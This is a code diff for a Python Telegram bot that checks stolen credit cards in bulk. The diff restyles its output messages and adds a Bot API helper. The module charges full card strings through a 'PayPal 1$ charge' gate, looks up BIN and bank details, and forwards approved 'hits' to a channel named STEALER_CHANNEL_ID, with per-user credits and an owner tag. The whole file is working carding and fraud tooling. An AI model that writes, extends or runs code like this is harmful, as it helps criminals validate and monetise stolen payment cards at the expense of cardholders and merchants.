@@ -15,6 +15,33 @@ STEALER_CHANNEL_ID = -1003627495953
 MAX_MSC_LIMIT = 10 
 MAX_TSC_LIMIT = 100
 
+# --- BOT API BRIDGE FOR COLLAPSIBLE INFO ---
+async def send_colored_msg(client, chat_id, text, reply_to_message_id=None, message_id=None):
+    token = client.bot_token if hasattr(client, 'bot_token') else os.environ.get("BOT_TOKEN")
+    if not token: return None
+    
+    url = f"https://api.telegram.org/bot{token}/"
+    payload = {
+        "chat_id": chat_id,
+        "text": text,
+        "parse_mode": "HTML",
+        "disable_web_page_preview": True
+    }
+    
+    async with httpx.AsyncClient() as http:
+        if message_id:
+            payload["message_id"] = message_id
+            method = "editMessageText"
+        else:
+            payload["reply_to_message_id"] = reply_to_message_id
+            method = "sendMessage"
+            
+        try:
+            r = await http.post(url + method, json=payload)
+            return r.json()
+        except:
+            return None
+
 async def send_hit_if_approved(client: Client, text: str):
     try:
         await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
@@ -34,9 +61,9 @@ async def call_stripe_api(fullcc):
                 gate_name = result_json.get("gate", "PayPal 1$ charge")
                 
                 if "APPROVED" in api_status or "SUCCESS" in api_status:
-                    return "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 🔥", response_msg, gate_name
+                    return "Approved ✓", response_msg, gate_name
                 elif "DECLINED" in api_status or "FAILED" in api_status or "FRAUDULENT" in api_status:
-                    return "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌", response_msg, gate_name
+                    return "Declined ✗", response_msg, gate_name
                 else:
                     return api_status, response_msg, gate_name
             except:
@@ -82,17 +109,17 @@ async def stripe_charge_cmd(Client, message):
         
         firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
+💠 𝘾𝙘-» <code>{fullcc}</code>
+💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
+💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■□□□"""
         await asyncio.sleep(0.5)
         firstchk = await message.reply_text(firstresp, quote=True)
 
         secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
+💠 𝘾𝙘-» <code>{fullcc}</code>
+💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
+💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■■■□"""
         await asyncio.sleep(0.5)
         secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
 
@@ -104,27 +131,36 @@ async def stripe_charge_cmd(Client, message):
 
         thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
+💠 𝘾𝙘-» <code>{fullcc}</code>
+💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
+💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■■■■"""
         await asyncio.sleep(0.5)
         thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
 
-        finalresp = f"""
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» {response}
-[玄] 𝘽𝙞𝙣 -» {brand} — {type_} — {level}
-[玄] 𝘽𝙖𝙣𝙠 -» {bank}
-[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» {country} {flag}
-[玄] 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
-[玄] 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯ {role}
-[玄] 𝙏𝙞𝙢𝙚 -» {time.perf_counter() - start:0.2f}s"""
-        await asyncio.sleep(0.5)
-        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
+        # Invisible lines to force collapse by default
+        invisible_lines = "&#160;\n" * 10
+        finalresp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
+💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
+💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
+════『 INFO 』════
+<blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
+💠 𝘽𝙞𝙣-» {brand}
+_{type_}-{level}
+💠 𝘽𝙖𝙣𝙠-» {bank}
+{invisible_lines}</blockquote>
+════『 META 』════
+💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
+💠 𝙏𝙞𝙢𝙚-» {time.perf_counter() - start:0.2f}s
+💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯
+{role}
+════『 OWNER 』════
+      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+        
+        await send_colored_msg(Client, message.chat.id, finalresp, message_id=thirdcheck.id)
+        
         await setantispamtime(user_id)
         await deductcredit(user_id)
-        if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
+        if "Approved" in status:
             await send_hit_if_approved(Client, finalresp)
     except Exception:
         import traceback
@@ -219,16 +255,16 @@ async def stripe_txt_check_cmd(Client, message):
 
 # --- SEQUENTIAL ONE-BY-ONE PROCESSING LOGIC ---
 async def process_sequential_check(Client, message, ccs, user_id, first_name, role):
-    initial_resp = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴀʀɢᴇ</b> ✧
+    initial_resp = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
 ▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
 
-[玄] 𝙂𝙖𝙩𝙚 -» PayPal 1$ charge
-[玄] 𝘾𝘾 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}
-[玄] 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 -» {first_name}
-[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
+💠 𝙂𝙖𝙩𝙚 -» PayPal 1$ charge
+💠 𝘾𝙘 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}
+💠 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 -» {first_name}
+💠 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
 ━━━━━━━━━━━━━━━━━━━━"""
     progress_msg = await message.reply(initial_resp, quote=True)
-    header_text = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴀʀɢᴇ</b> ✧
+    header_text = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
 ━━━━━━━━━━━━━━━━━━━━
 """
     final_text = header_text
@@ -236,35 +272,37 @@ async def process_sequential_check(Client, message, ccs, user_id, first_name, ro
     
     for fullcc in ccs:
         status, response, gateway = await call_stripe_api(fullcc)
-        
         cc_num = fullcc.split('|')[0]
         getbin = await get_bin_details(cc_num)
         brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]
         
-        card_resp = f"""[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}
-[玄] 𝙍𝙚𝙨𝙪𝙡𝙩 -» {response}
-
-[玄] 𝘽𝙞𝙣 -» {brand} — {type_} — {level}
-[玄] 𝘽𝙖𝙣𝙠 -» {bank}
-[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» {country} {flag}
+        invisible_lines = "&#160;\n" * 10
+        card_resp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
+💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
+💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
+════『 INFO 』════
+<blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
+💠 𝘽𝙞𝙣-» {brand}
+_{type_}-{level}
+💠 𝘽𝙖𝙣𝙠-» {bank}
+{invisible_lines}</blockquote>
 ━━━━━━━━━━━━━━━━━━━━
 """
         final_text += card_resp
-        
         try:
             await progress_msg.edit_text(final_text, disable_web_page_preview=True)
-        except:
-            pass
-        
+        except: pass
         await asyncio.sleep(0.5)
 
     elapsed_time = round(time.perf_counter() - start_time, 2)
-    footer = f"""[玄] 𝙏𝙞𝙢𝙚 -» {elapsed_time}s
-[玄] 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={user_id}'>{first_name}</a> ↯ {role}
-[玄] 𝙊𝙬𝙣𝙚𝙧 -» @spid_3r
-━━━━━━━━━━━━━━━━━━━━"""
-    
+    footer = f"""════『 META 』════
+💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
+💠 𝙏𝙞𝙢𝙚-» {elapsed_time}s
+💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={user_id}'>{first_name}</a> ↯
+{role}
+════『 OWNER 』════
+      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
     final_text += footer
-    await progress_msg.edit_text(final_text, disable_web_page_preview=True)
+    
+    await send_colored_msg(Client, message.chat.id, final_text, message_id=progress_msg.id)
     await setantispamtime(user_id)
